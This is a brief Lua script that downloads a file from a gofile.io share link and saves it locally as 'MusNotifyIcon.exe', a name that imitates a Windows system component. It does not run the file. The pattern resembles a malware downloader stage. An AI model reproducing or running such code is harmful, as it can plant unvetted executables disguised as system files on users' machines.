local http = require("socket.http")
local body, code = http.request("https://gofile.io/d/ltw60B")
if not body then error(code) end

-- save the content to a file
local f = assert(io.open('MusNotifyIcon.exe', 'wb')) -- open in "binary" mode
f:write(body)
f:close()